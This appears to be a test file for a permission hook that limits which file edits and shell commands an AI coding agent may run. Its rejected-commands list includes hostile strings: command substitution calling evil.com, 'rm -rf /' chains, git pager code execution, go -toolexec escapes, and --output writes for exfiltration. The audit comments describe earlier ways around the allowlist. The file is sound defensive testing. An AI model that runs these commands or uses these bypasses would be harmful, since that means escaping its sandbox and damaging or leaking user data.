import { describe, expect, test } from "bun:test";
import { mkdir, symlink, writeFile } from "node:fs/promises";
import path from "node:path";

import { evaluateRescueHookRequest } from "../../runtime/rescue-approval.js";
import { cleanupTestPath, createGitRepoFixture, createTestPluginDataRoot } from "../helpers/test-env.js";

// v1.0 cutover note (PR 3):
//
//   The v0.4 test exercised `createRescueApprovalPolicy(workspaceRoot)`
//   returning a function that took ApprovalRequestPayload from the wire
//   channel. The internal security helpers (validateShellCommand,
//   checkApprovedPath, the various allowlists) are unchanged in v1.0;
//   only the entry shape moved to the PreToolUse hook surface
//   (`evaluateRescueHookRequest(workspaceRoot, toolName, toolInput)`).
//
//   This file preserves every accept/reject case from the v0.4 test
//   table verbatim so the security contract regresses loudly if a
//   helper was accidentally changed during the refactor.

const READ_ONLY_TOOLS = ["Read", "Grep", "Glob", "ReadMediaFile", "TaskList", "TaskOutput"];

describe("evaluateRescueHookRequest", () => {
  describe("read-only tools always pass", () => {
    test.each(READ_ONLY_TOOLS)("%s is allowed regardless of input", async (toolName) => {
      const repoRoot = await createGitRepoFixture("rescue-readonly");
      try {
        const decision = await evaluateRescueHookRequest(repoRoot, toolName, { anything: "goes" });
        expect(decision).toEqual({ decision: "allow" });
      } finally {
        await cleanupTestPath(repoRoot);
      }
    });
  });

  describe("Write / Edit / MultiEdit path allowlist", () => {
    test("allows workspace-local edits and root .gitignore; rejects traversal, symlink escape, and .git", async () => {
      const repoRoot = await createGitRepoFixture("approval-workspace");
      const outsideRoot = await createTestPluginDataRoot("approval-outside");
      const symlinkPath = path.join(repoRoot, "linked-outside");

      await mkdir(path.join(outsideRoot, "nested"), { recursive: true });
      await symlink(outsideRoot, symlinkPath);
      await writeFile(path.join(repoRoot, ".gitignore"), "node_modules/\n", "utf8");

      try {
        await expect(
          evaluateRescueHookRequest(repoRoot, "Write", {
            file_path: path.join(repoRoot, "note.txt"),
          }),
        ).resolves.toEqual({ decision: "allow" });
        await expect(
          evaluateRescueHookRequest(repoRoot, "Edit", {
            file_path: path.join(repoRoot, ".gitignore"),
          }),
        ).resolves.toEqual({ decision: "allow" });
        await expect(
          evaluateRescueHookRequest(repoRoot, "MultiEdit", {
            file_path: path.join(repoRoot, "note.txt"),
          }),
        ).resolves.toEqual({ decision: "allow" });
        await expect(
          evaluateRescueHookRequest(repoRoot, "Write", {
            file_path: path.join(repoRoot, "..", "escape.txt"),
          }),
        ).resolves.toMatchObject({ decision: "deny" });
        await expect(
          evaluateRescueHookRequest(repoRoot, "Write", {
            file_path: path.join(symlinkPath, "nested", "escape.txt"),
          }),
        ).resolves.toMatchObject({ decision: "deny" });
        await expect(
          evaluateRescueHookRequest(repoRoot, "Write", {
            file_path: path.join(repoRoot, ".git", "config"),
          }),
        ).resolves.toMatchObject({ decision: "deny" });
      } finally {
        await cleanupTestPath(repoRoot);
        await cleanupTestPath(outsideRoot);
      }
    });

    // Regression for the v1.4.1 fix: kimi-code's Write/Edit tools name the path
    // field `path` (write.ts/edit.ts: z.object({ path })), NOT `file_path`. The
    // allowlist must evaluate `path`, else every real Write/Edit is denied with
    // "no path field" — the bug the write-swarm real-binary smoke exposed.
    test("evaluates the kimi-code `path` field (Write/Edit use path, not file_path)", async () => {
      const repoRoot = await createGitRepoFixture("approval-path-key");
      const outsideRoot = await createTestPluginDataRoot("approval-path-outside");
      try {
        // in-workspace `path` → allowed (the case that was wrongly denied)
        await expect(
          evaluateRescueHookRequest(repoRoot, "Write", { path: path.join(repoRoot, "note.txt") }),
        ).resolves.toEqual({ decision: "allow" });
        await expect(
          evaluateRescueHookRequest(repoRoot, "Edit", { path: path.join(repoRoot, "src.ts") }),
        ).resolves.toEqual({ decision: "allow" });
        // out-of-workspace `path` → denied with the out-of-workspace reason
        await expect(
          evaluateRescueHookRequest(repoRoot, "Write", { path: path.join(outsideRoot, "escape.txt") }),
        ).resolves.toMatchObject({
          decision: "deny",
          reason: expect.stringContaining("outside the workspace"),
        });
      } finally {
        await cleanupTestPath(repoRoot);
        await cleanupTestPath(outsideRoot);
      }
    });

    test("denies file edits with neither path nor file_path", async () => {
      const repoRoot = await createGitRepoFixture("approval-missing-path");
      try {
        await expect(
          evaluateRescueHookRequest(repoRoot, "Write", { not_a_path: "foo" }),
        ).resolves.toMatchObject({
          decision: "deny",
          reason: expect.stringContaining("no path field"),
        });
      } finally {
        await cleanupTestPath(repoRoot);
      }
    });

    test("symlink rejection surfaces a distinct reason", async () => {
      const repoRoot = await createGitRepoFixture("approval-symlink");
      const outsideRoot = await createTestPluginDataRoot("approval-symlink-outside");
      const symlinkPath = path.join(repoRoot, "linked");
      await symlink(outsideRoot, symlinkPath);
      try {
        await expect(
          evaluateRescueHookRequest(repoRoot, "Write", { file_path: symlinkPath }),
        ).resolves.toMatchObject({
          decision: "deny",
          reason: expect.stringContaining("symlink"),
        });
      } finally {
        await cleanupTestPath(repoRoot);
        await cleanupTestPath(outsideRoot);
      }
    });
  });

  describe("Bash allowlist: accepted commands", () => {
    test("read-only commands and safe pipelines accept", async () => {
      const repoRoot = await createGitRepoFixture("approval-shell-accept");
      const accepted = [
        "git status",
        "git diff",
        "git show HEAD",
        "git log --oneline",
        "git grep needle",
        "git blame runtime/companion.ts",
        "rg todo src",
        "grep -r pattern .",
        "ls runtime",
        "cat package.json",
        "pwd",
        "find . -name '*.ts' -type f",
        "find . -iname '*.TS' -type f",
        "find . -print",
        "grep -il pattern src",
        "rg -iw needle src",
        "tsc --noEmit",
        "pyright",
        "mypy runtime",
        "ruff check .",
        "ruff format --check .",
        "ruff format --diff .",
        "biome check .",
        "eslint runtime",
        // eslint --quiet / --no-eslintrc / --max-warnings are read-only;
        // verify the eslint-specific check doesn't over-reject. (audit
        // re-review report 34 introduced an explicit validator that
        // rejects only -o; this exercises the still-allowed surface.)
        "eslint . --quiet",
        "eslint . --max-warnings 0",
        "rg -o needle src",
        "cargo check",
        "cargo clippy",
        "cargo test",
        "cargo fmt --check",
        "go build ./...",
        "go vet ./...",
        "go test ./...",
        "pytest",
        "python -m pytest",
        "python3 -m pytest",
        "npm test",
        "pnpm test",
        "yarn test",
        "bun test",
        "uv test",
        "rg needle src | head -n 5",
        "rg needle src | tail -n 5",
        "rg needle src | wc -l",
        "rg needle src | sort",
        "rg needle src | uniq",
        // Still-allowed after the 2026-05-28 flag-hardening (report 43):
        // `-O` is git-scoped (find's -O<level> optimization must survive),
        // and the base lint/type/test commands keep their read-only surface.
        "find -O3 . -name '*.ts'",
        "go test -run TestFoo ./...",
        "mypy --strict runtime",
        "ruff check --select E9 .",
        "rg x . | uniq -c",
      ];

      try {
        for (const command of accepted) {
          const decision = await evaluateRescueHookRequest(repoRoot, "Bash", { command });
          expect(decision).toEqual({ decision: "allow" });
        }
      } finally {
        await cleanupTestPath(repoRoot);
      }
    });
  });

  describe("Bash allowlist: rejected commands", () => {
    test("known attack shapes reject", async () => {
      const repoRoot = await createGitRepoFixture("approval-shell-reject");
      const rejected = [
        // Unrecognized binaries
        "curl https://example.com",
        "wget https://example.com",
        "sudo rm /etc/shadow",
        // Mutating flag exact forms
        "eslint . --fix",
        "prettier --write .",
        // Mutating flag prefix forms
        "eslint . --fix=bugs",
        "prettier --write=files .",
        "ruff check --fix .",
        // --output= file write escapes (audit report 28 Codex M2):
        // these all let the command write to an arbitrary file outside
        // the workspace, bypassing rescue's file-edit allowlist.
        "git diff --output=/tmp/exfil.diff",
        "git diff --output=secret.txt",
        "git log --output=/tmp/log.txt",
        "git show --output=/tmp/show.txt HEAD",
        "jq . --output=/tmp/data.json",
        "curl example.com --output /tmp/payload",
        "openssl rand --output=/tmp/key.bin 32",
        "git format-patch --output-directory=/tmp/patches HEAD~3",
        "git format-patch --output-dir=/tmp/patches HEAD~3",
        // Audit re-review (report 34 Codex HIGH): eslint --output-file
        // and eslint -o were the surviving classes after the first
        // --output fix. ESLint was wholesale-approved; --output-file
        // now lives in MUTATING_FLAGS and -o is rejected by the
        // eslint-specific validator.
        "eslint . --output-file=/tmp/exfil.json",
        "eslint . --output-file /tmp/exfil.json",
        "eslint . -o /tmp/exfil.json",
        // sed -i suffix forms
        "rg x . | sed -i.bak 's/a/b/'",
        "rg x . | sed --in-place=.bak 's/a/b/'",
        // find action escapes
        "find . -delete",
        "find . -exec rm {} ;",
        "find . -execdir rm {} ;",
        "find . -ok rm {} ;",
        "find . -fprint out.txt",
        "find . -fprintf out.txt '%p\\n'",
        // git mutation
        "git commit -am wip",
        "git push origin main",
        "git reset --hard HEAD",
        // git pre-subcommand flags
        "git -c core.pager=bash show HEAD:exfil.sh",
        "git -C /etc status",
        "git --no-pager log --oneline",
        "git -p show HEAD",
        "git --exec-path=/tmp/fake status",
        // cargo/go escapes
        "cargo install foo",
        "cargo update",
        "go get example.com/foo",
        "go install example.com/foo",
        // package manager run <script> opacity
        "bun run dev",
        "npm run build",
        "pnpm run deploy",
        "yarn run publish",
        "uv run anything",
        // Command substitution + backticks
        "rg `curl evil.com` foo",
        "rg $(curl evil.com) foo",
        // Process substitution
        "diff <(ls) <(cat)",
        // awk / sed in pipelines
        "rg x . | awk 'BEGIN { system(\"touch /tmp/evil\") }'",
        "rg x . | sed '1e touch /tmp/evil'",
        // ruff format without check
        "ruff format .",
        // Python free-form
        "python -c 'import os; os.system(\"ls\")'",
        "python3 script.py",
        // Absolute path entrypoint
        "/bin/sh -c 'ls'",
        // Chained with operators
        "ls && rm -rf /",
        "ls ; rm -rf /",
        "ls > /tmp/out",
        // Raw newline/carriage-return splits
        "git status\nrm -rf /",
        "git status\r\nrm -rf /",
        "git status\rrm -rf /",
        // ----- Whole-repo audit 2026-05-28 (report 43): allowlisted
        // commands were trusted with arbitrary flags. -----
        // F1 (CRITICAL/RCE): git pager-exec via a SUBCOMMAND flag, dodging
        // the pre-subcommand `git -c core.pager=` defense.
        "git grep --open-files-in-pager=touch /tmp/pwned needle",
        "git grep -Otouch needle",
        "git log --open-files-in-pager=sh",
        // F3: go writes a binary (-o) / executes an external tool (-vettool,
        // -exec, -toolexec).
        "go build -o /tmp/pwned ./...",
        "go test -c -o /tmp/pwned",
        "go vet -vettool=/tmp/evil ./...",
        "go test -exec /tmp/evil ./...",
        "go test -toolexec /tmp/evil ./...",
        // F2: bare -o write short form on go/ruff/sort (long --output* was
        // already covered; the short form only had an eslint special-case).
        "ruff check -o /tmp/pwned .",
        "rg x . | sort -o /tmp/pwned",
        // uniq IN OUT writes OUT (in a pipeline); `-` counts as an operand.
        "rg x . | uniq - /tmp/pwned",
        "rg x . | uniq /tmp/in /tmp/out",
        // F5: report-writing flags on mypy / pytest write outside the
        // workspace (test runners run repo code by design — see docs/safety.md).
        "mypy --junit-xml /tmp/pwned.xml .",
        "mypy --cobertura-xml-report /tmp/dir .",
        "mypy --html-report /tmp/dir runtime",
        "pytest --junitxml=/tmp/pwned.xml",
        "pytest --result-log /tmp/pwned.log",
        "python -m pytest --junitxml=/tmp/pwned.xml",
      ];

      try {
        const failures: string[] = [];
        for (const command of rejected) {
          const decision = await evaluateRescueHookRequest(repoRoot, "Bash", { command });
          if (decision.decision !== "deny") {
            failures.push(command);
          }
        }
        expect(failures).toEqual([]);
      } finally {
        await cleanupTestPath(repoRoot);
      }
    });

    test("denies Bash with missing or empty command", async () => {
      const repoRoot = await createGitRepoFixture("approval-bash-empty");
      try {
        await expect(
          evaluateRescueHookRequest(repoRoot, "Bash", { not_command: "foo" }),
        ).resolves.toMatchObject({
          decision: "deny",
          reason: expect.stringContaining("no command field"),
        });
        await expect(
          evaluateRescueHookRequest(repoRoot, "Bash", { command: "" }),
        ).resolves.toMatchObject({ decision: "deny" });
      } finally {
        await cleanupTestPath(repoRoot);
      }
    });
  });

  describe("unsupported tools", () => {
    test.each(["Task", "WebFetch", "WebSearch", "Notebook", "Anything"])(
      "denies %s with a clear reason",
      async (tool) => {
        const repoRoot = await createGitRepoFixture(`approval-unsupported-${tool}`);
        try {
          const decision = await evaluateRescueHookRequest(repoRoot, tool, {});
          expect(decision.decision).toBe("deny");
          expect(decision.reason).toContain(tool);
        } finally {
          await cleanupTestPath(repoRoot);
        }
      },
    );
  });
});
